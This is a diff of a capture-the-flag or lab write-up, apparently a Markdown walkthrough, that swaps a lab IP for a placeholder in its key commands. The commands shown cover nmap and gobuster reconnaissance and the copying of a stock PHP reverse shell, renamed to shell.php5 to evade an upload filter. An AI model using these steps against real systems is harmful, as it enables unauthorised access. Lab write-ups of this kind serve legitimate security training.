@@ -23,8 +23,8 @@ The objective was to gain initial access through the web server, retrieve the us
 ## Key Commands
 
 ```bash
-nmap -sC -sV -Pn 10.48.155.140
-gobuster dir -u http://10.48.155.140 -w /usr/share/wordlists/dirb/common.txt
+nmap -sC -sV -Pn <target-ip>
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
 locate php-reverse-shell.php
 cp /usr/share/webshells/php/php-reverse-shell.php .
 mv php-reverse-shell.php shell.php5
